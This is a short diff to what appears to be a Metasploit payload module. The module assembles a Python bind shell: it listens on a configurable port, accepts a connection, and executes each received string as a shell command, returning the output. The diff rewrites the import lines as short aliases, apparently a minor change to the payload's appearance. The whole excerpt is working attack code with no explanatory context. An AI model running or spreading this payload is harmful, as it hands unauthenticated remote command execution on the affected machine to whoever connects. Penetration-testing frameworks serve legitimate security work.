@@ -38,15 +38,16 @@ module MetasploitModule
     cmd = ''
     dead = Rex::Text.rand_text_alpha(3)
     # Set up the socket
-    cmd << "import socket,subprocess\n"
-    cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
+    cmd << "import socket as s\n"
+    cmd << "import subprocess as r\n"
+    cmd << "so=s.socket(s.AF_INET,s.SOCK_STREAM)\n"
     cmd << "so.bind(('#{datastore['RHOST']}',#{ datastore['LPORT']}))\n"
     cmd << "so.listen(1)\n"
     cmd << "so,addr=so.accept()\n"
     cmd << "#{dead}=False\n"
     cmd << "while not #{dead}:\n"
     cmd << "\tdata=so.recv(1024)\n"
-    cmd << "\tp=subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
+    cmd << "\tp=r.Popen(data, shell=True, stdin=r.PIPE, stdout=r.PIPE, stderr=r.PIPE)\n"
     cmd << "\tstdout_value=p.stdout.read()+p.stderr.read()\n"
     cmd << "\tso.send(stdout_value)\n"
 
